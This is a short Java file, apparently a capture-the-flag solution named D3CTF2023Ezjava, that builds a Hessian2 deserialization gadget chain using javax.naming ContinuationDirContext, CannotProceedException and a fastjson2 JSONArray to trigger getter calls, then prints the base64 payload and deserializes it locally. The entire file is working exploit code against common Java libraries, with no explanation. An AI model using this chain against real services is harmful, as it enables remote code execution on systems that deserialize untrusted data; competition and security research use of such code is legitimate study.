package dev.silente.javashark.solution;

import com.alibaba.fastjson2.JSONArray;
import com.alibaba.fastjson2.JSONObject;
import com.caucho.hessian.io.AbstractHessianInput;
import com.caucho.hessian.io.AbstractMapDeserializer;
import com.caucho.hessian.io.Hessian2Input;
import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.SerializeUtils;
import dev.silente.javashark.utils.TestUtils;

import javax.naming.CannotProceedException;
import java.io.ByteArrayInputStream;
import java.util.Hashtable;
public class D3CTF2023Ezjava {
    public static void main(String[] args) throws Exception {
//
        CannotProceedException cpe = ReflectUtils.createWithoutConstructor(CannotProceedException.class);
        cpe.setResolvedObj(new TestUtils());
        Object ctx = ReflectUtils.newInstance(
                "javax.naming.spi.ContinuationDirContext",
                cpe, new Hashtable<>()
        );


        // toString2Getter
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(ctx);

        byte[] code = SerializeUtils.hessian2SerializeThrowExpectToString(jsonArray);
        System.out.println(MiscUtils.base64Encode(code));
        SerializeUtils.hessian2Deserialize(code);
    }
}
